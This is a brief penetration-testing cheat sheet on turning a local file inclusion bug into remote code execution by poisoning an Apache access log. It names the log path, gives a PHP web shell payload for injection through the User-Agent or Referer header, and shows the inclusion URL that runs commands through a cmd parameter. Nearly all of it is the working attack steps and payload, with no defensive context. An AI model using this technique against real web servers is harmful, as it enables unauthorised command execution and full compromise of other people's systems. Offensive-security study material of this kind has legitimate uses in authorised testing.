# LFI

If you locate an LFI, first try to get RCE.

### 1) Locate a writable log file

    /var/log/apache2/access.log

### 2) Inject a payload

Inject a simple web shell payload into a request header (e.g., User-Agent or Referer) that the web server will log.

Payload:

    <?php echo system($_GET[‘cmd’]); ?>

### 3) Execute via LFI

    http://example.com/vulnerable.php?page=/path/to/log/access.log&cmd=whoami
